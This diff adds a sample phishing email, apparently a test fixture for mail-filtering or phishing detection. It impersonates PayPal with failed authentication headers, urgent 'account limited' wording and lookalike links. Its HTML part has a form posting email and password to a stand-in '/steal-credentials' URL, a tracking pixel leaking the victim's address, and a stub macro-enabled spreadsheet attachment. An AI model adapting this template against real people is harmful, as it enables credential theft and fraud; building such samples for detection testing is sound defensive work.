@@ -1,0 +1,67 @@
+From: "PayPal Security" <security@paypal-secure-update.ru>
+To: victim@example.com
+Subject: =?UTF-8?Q?=E2=9A=A0=EF=B8=8F_Urgent=3A_Your_PayPal_account_has_been_limited?=
+Date: Mon, 3 Apr 2026 09:14:22 +0000
+Message-ID: <20260403091422.abc123@paypal-secure-update.ru>
+Reply-To: support@totally-not-paypal.xyz
+Return-Path: <bounce@paypal-secure-update.ru>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_12345"
+X-Mailer: PHPMailer 6.5.0 (php mailer)
+Received-SPF: fail (domain of paypal-secure-update.ru does not designate
+    192.168.99.1 as permitted sender) client-ip=192.168.99.1;
+Authentication-Results: mx.example.com;
+    spf=fail smtp.mailfrom=paypal-secure-update.ru;
+    dkim=fail header.d=paypal-secure-update.ru;
+    dmarc=fail action=quarantine header.from=paypal-secure-update.ru
+Received: from mail.evil-relay.cn (mail.evil-relay.cn [192.168.99.1])
+    by mx.example.com with SMTP id abc123; Mon, 3 Apr 2026 09:14:20 +0000
+Received: from localhost (localhost [127.0.0.1])
+    by mail.evil-relay.cn with SMTP id xyz456; Mon, 3 Apr 2026 09:14:18 +0000
+
+------=_Part_12345
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Valued Customer,
+
+We have detected unusual activity on your PayPal account.
+Your account has been temporarily limited.
+
+Please verify your account immediately:
+http://paypal-secure-update.ru/verify?token=abc123&redirect=http://evil.com
+
+Or click here: https://bit.ly/3xY9pHk
+
+If you do not verify within 24 hours your account will be permanently suspended.
+
+PayPal Security Team
+
+------=_Part_12345
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<body>
+<p>Dear Valued Customer,</p>
+<p>We detected <strong>suspicious activity</strong> on your account.</p>
+<a href="http://paypal-secure-update.ru/verify?token=abc123">Click here to verify now</a>
+<br>
+<a href="https://bit.ly/3xY9pHk">Secure verification portal</a>
+<form action="http://paypal-secure-update.ru/steal-credentials" method="POST">
+  <input type="text" name="email" placeholder="Email">
+  <input type="password" name="password" placeholder="Password">
+  <input type="submit" value="Verify Account">
+</form>
+<img src="http://evil-tracker.ru/pixel.gif?id=victim@example.com" width="1" height="1">
+</body>
+</html>
+
+------=_Part_12345
+Content-Type: application/vnd.ms-excel.sheet.macroenabled.12
+Content-Disposition: attachment; filename="Account_Statement_2026.xlsm"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAUAAAAZG9jUHJvcHMvYXBwLnhtbA==
+
+------=_Part_12345--
